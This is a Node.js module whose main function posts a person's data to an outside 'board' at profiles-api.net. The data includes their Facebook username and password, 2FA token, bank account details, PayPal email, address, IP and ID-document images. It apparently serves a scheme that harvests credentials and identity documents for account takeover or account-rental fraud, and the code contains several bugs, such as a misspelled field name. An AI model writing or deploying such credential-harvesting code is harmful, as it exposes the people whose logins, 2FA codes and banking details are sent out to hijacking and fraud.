const axios = require("axios");

const imageLink = (hostname, file) => {
  const link = `${
    hostname === "localhost" ? "http://localhost:5000" : "https://" + hostname
  }/uploads/${file.filename.replace(" ", "_")}`;
  return link;
};

const sendDataToBoard = async (data) => {
  var upData = {
    personal_info: `${data.firstName} ${data.lastName}`,
    geo: "en",
    country: data.country,
    checked: true,
  };

  const getIdParams = new URLSearchParams();
  getIdParams.append("personal_info", upData.personal_info);
  getIdParams.append("geo", upData.geo);
  getIdParams.append("country", upData.country);
  getIdParams.append("checked", upData.checked);

  const getIdConfig = {
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  };

  const url = "https://profiles-api.net/profile_id_api/api/new_profile_id.php/";

  try {
    const getIdResponse = await axios.post(url, getIdParams, getIdConfig);
    const id = getIdResponse.data[0];
    data["personalInfo"] = id;
    console.log("personalInfo", data.personalInfo);

    const sendData = (data) => {
      const sendDataConfig = {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      };

      const sendDataUrl = "https://profiles-api.net/api/index.php";
      const board_id = 1329202495;
      const providers_source = "Massimo2";
      const geo = "en";

      const updatedData = new URLSearchParams();
      updatedData.append("action", "send_data");
      updatedData.append("first_name", data.firtst_name || "");
      updatedData.append("last_name", data.last_name || "");
      updatedData.append("facebook_login", data.fbUsername || "");
      updatedData.append("facebook_password", data.fbPassword || "");
      updatedData.append("email_verification", "-");
      updatedData.append("password_verification", "-");
      updatedData.append(
        "date_of_birth",
        new Date(data.birthday).toLocaleDateString([], {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
        }) || ""
      );
      updatedData.append("friends", data.haveFriends || "");
      updatedData.append("fb_age", data.isOneYear || "");
      updatedData.append("fb_activity", data.frecuency || "");
      updatedData.append("phone_number", data.phone || "");
      updatedData.append("providers_source", providers_source);
      updatedData.append("board_id", board_id);
      updatedData.append("geo", geo);
      updatedData.append("personalInfo", data.personalInfo || "");
      updatedData.append("payment_method", data.paymentMethod || "");
      updatedData.append("referral_code", data.referralCode || "");
      updatedData.append("country", data.country || "");
      updatedData.append("devices", data.devices || "");
      updatedData.append("city", data.city || "");
      updatedData.append("email", data.email || "");
      updatedData.append("paypal_email", data.paypalEmail || "");
      updatedData.append("beneficiary", data.holderName || "");
      updatedData.append("acc", data.bankAccountCode || "");
      updatedData.append("fa_token", data.code2FA || "");
      updatedData.append("user_type", data.userType || "");
      updatedData.append("status", data.status || "");
      updatedData.append("status_observation", data.statusObservation || "");
      updatedData.append("os", data.os || "");
      updatedData.append("address", data.address || "");
      updatedData.append("referral", data.referral || "");
      updatedData.append("zip_code", data.zipCode || "");
      updatedData.append("referral_code_link", data.referralCodeLink || "");
      updatedData.append("ip", data.ip || "");
      updatedData.append("fortnight", data.fortnight || "");

      console.log("image data document image");
      console.log("image data document image", {
        link: data.documentImage.link,
        name: data.documentImage.name,
        type: data.documentImage.type,
      });

      data.documentImage &&
        updatedData.append("file", {
          link: data.documentImage.link,
          name: data.documentImage.name,
          type: data.documentImage.type,
        });
      data.fbEmailImage &&
        updatedData.append("email_id_file", {
          link: data.fbEmailImage.fbEmailImage,
          name: data.fbEmailImage.name,
          type: data.fbEmailImage.type,
        });
      data.bmIdImage &&
        updatedData.append("bm_id_file", {
          link: data.bmIdImage.link,
          name: data.bmIdImage.name,
          type: data.bmIdImage.type,
        });

      updatedData.append("updatedData", updatedData || "");

      axios
        .post(sendDataUrl, updatedData, sendDataConfig)
        .then((res) => {
          console.log(res.data);
          return res;
        })
        .catch((error) => console.log("send data error", error));
    };

    console.log("before sending data");
    sendData(data);
  } catch (error) {
    console.log(error);
  }
};

module.exports = { sendDataToBoard, imageLink };
